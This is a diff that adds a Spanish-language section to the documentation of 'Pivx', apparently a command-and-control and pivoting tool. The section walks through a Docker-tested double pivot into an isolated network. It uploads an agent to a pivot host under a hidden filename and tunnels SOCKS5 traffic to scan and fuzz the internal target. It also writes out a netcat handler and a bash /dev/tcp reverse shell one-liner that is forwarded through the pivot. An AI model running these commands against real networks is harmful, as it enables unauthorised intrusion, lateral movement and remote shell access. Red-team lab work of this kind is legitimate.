@@ -231,6 +231,98 @@ partir de ahí, todo el tráfico de Burp hacia la red interna va por el agente.
 
 ---
 
+## Escenario Práctico: Doble Salto hacia Redes Aisladas
+
+Ejemplo real probado con Docker: comprometer una máquina que **no tiene salida
+a internet** a través de un host pivote que hace puente entre dos redes.
+
+### Topología
+
+```
+  Tu máquina (Kali)          Red pública              Red interna (aislada)
+  ┌─────────────┐          ┌─────────────┐          ┌──────────────────┐
+  │  Pivx C2    │◄── WS ──►│  Pivote      │          │  Target          │
+  │  10.10.10.10│          │  10.10.10.20 │──────────│  10.10.20.100    │
+  │             │          │  10.10.20.20 │          │  (sin internet)  │
+  └─────────────┘          └─────────────┘          └──────────────────┘
+    SOCKS5 :1080             Agente Pivx               HTTP :80
+    Handler :9001            rforward :4444
+```
+
+El C2 **no puede alcanzar** `10.10.20.0/24` directamente. Pivx lo resuelve.
+
+### Paso 1 — Subir y ejecutar el agente en el host pivote
+
+```bash
+# Desde tu C2, sube el agente al pivote (que sí tiene salida):
+scp dist/pivx-agent-linux-amd64 usuario@10.10.10.20:/tmp/.p
+
+# En el pivote:
+chmod +x /tmp/.p
+/tmp/.p --server ws://10.10.10.10:8765
+```
+
+El agente se conecta al C2, reporta sus interfaces y descubre la subred
+`10.10.20.0/24`. El dashboard lo muestra como **online**.
+
+### Paso 2 — Alcanzar la red aislada con SOCKS5 (inbound)
+
+En el dashboard, sección **Proxy SOCKS5**, pulsa **Iniciar SOCKS5**
+(`127.0.0.1:1080`). Ahora puedes alcanzar máquinas de la red interna:
+
+```bash
+# Escanear puertos del target aislado:
+proxychains -q nmap -sT -Pn -p 22,80,443,445 10.10.20.100
+
+# Navegar el servicio web interno:
+curl --socks5-hostname 127.0.0.1:1080 http://10.10.20.100/
+
+# Fuzzing de directorios:
+ffuf -x socks5://127.0.0.1:1080 -u http://10.10.20.100/FUZZ -w wordlist.txt
+
+# Burp Suite: Settings → Network → SOCKS proxy → 127.0.0.1:1080
+#   (marca "Do DNS lookups over SOCKS proxy")
+```
+
+El tráfico fluye: `tu herramienta → SOCKS5 :1080 → MUX → pivote → 10.10.20.100`.
+La resolución DNS y la conexión TCP ocurren **del lado del pivote**, así que los
+nombres internos se resuelven en la red víctima.
+
+### Paso 3 — Recibir reverse shells con remote forward (outbound)
+
+El target aislado no puede conectarse a tu C2, pero sí al pivote. Usa
+**remote forward** para que el pivote reenvíe las conexiones a tu máquina:
+
+```bash
+# 1) En el dashboard: sección "Port forwarding (L4)" → pestaña "Remote (-R)"
+#    Bind víctima: 0.0.0.0:4444
+#    Destino local: 127.0.0.1:9001
+#    → Clic en "Crear"
+
+# 2) Prepara tu handler en el C2:
+nc -lvnp 9001
+
+# 3) Ejecuta el payload en el target apuntando al pivote:
+#    (ejemplo: reverse shell bash, o cualquier payload que conecte a pivote:4444)
+bash -i >& /dev/tcp/10.10.20.20/4444 0>&1
+```
+
+El tráfico fluye: `target → pivote:4444 → MUX → C2:9001`. Tu handler
+recibe la shell como si viniera de `127.0.0.1`.
+
+### Resultado verificado
+
+Este escenario se probó con tests automatizados en Docker (3 contenedores,
+2 redes aisladas). Resultados:
+
+| Test | Resultado | Latencia |
+|------|-----------|----------|
+| SOCKS5 inbound → target:80 | Respuesta HTTP 200 completa | ~25ms |
+| Remote forward ← reverse shell | Payload recibido en C2:9001 | ~13s (espera del script) |
+| Streams residuales tras cierre | 0 (sin leaks) | — |
+
+---
+
 ## Limitaciones conocidas / Tips de uso
 
 Léelo antes de escanear: evita perder tiempo persiguiendo "hosts caídos" que en
